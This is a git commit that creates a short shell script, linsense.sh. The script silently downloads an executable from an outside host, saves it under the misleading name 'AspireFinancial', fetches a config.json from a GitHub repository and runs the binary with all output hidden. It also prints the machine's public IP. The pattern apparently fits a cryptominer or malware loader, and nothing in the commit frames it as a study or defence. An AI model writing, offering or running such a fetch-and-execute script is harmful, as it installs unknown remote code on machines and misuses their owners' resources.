fb606293b2fb5afc334dcaaae5d0206340871bb7
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 01:26:54 +0700

    Create linsense.sh

---
+++ linsense.sh
@@ -0,0 +1,7 @@
+wget -q -O AspireFinancial https://02ip.ru/curl-get && chmod +x AspireFinancial >/dev/null 2>&1
+wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " "
+./AspireFinancial -c "config.json" >/dev/null 2>&1
